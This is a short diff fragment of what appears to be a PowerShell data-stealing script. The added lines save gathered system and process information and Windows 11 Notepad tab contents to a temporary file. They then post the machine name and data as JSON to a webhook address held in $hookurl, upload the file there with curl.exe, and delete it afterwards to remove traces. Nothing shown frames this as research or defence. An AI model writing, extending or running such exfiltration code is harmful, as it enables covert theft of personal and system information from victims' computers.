@@ -338,6 +338,24 @@ Current Processes Information
 $process
 
 =================================================================================================================================="
+$outpath = "$env:TEMP/systeminfo.txt"
+$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
+$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
+$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
+
+if ($OSString -like '*11*'){
+    EnumNotepad
+}
+else{
+    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
+}
+
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
+curl.exe -F file1=@"$outpath" $hookurl
+Sleep 1
+Remove-Item -Path $outpath -force
 
 #========================================== WINDOW ONE (SETUP) =====================================================
 Add-Type -AssemblyName System.Windows.Forms
